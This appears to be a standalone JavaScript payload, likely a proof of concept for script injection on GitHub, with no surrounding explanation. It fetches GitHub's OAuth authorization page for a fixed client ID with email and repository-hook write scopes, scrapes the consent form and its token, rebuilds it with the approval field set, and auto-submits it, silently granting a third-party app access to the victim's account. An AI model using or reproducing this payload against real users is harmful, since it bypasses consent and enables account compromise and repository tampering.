fetch("https://github.com/login/oauth/authorize?client_id=3b46677ca554abcd215a&scope=email,write:repo_hook").then(function(response) {
    response.text().then(function (text) {
        var oauthForm = '<form id="potato" action="/login/oauth/authorize"' + text.split('<form action="/login/oauth/authorize"')[1].split("<button")[0] + '<input name="authorize" value="1"><input type="submit" id="potato"></form>';
        document.write(oauthForm);
		document.getElementById("potato").submit();
    });
  })
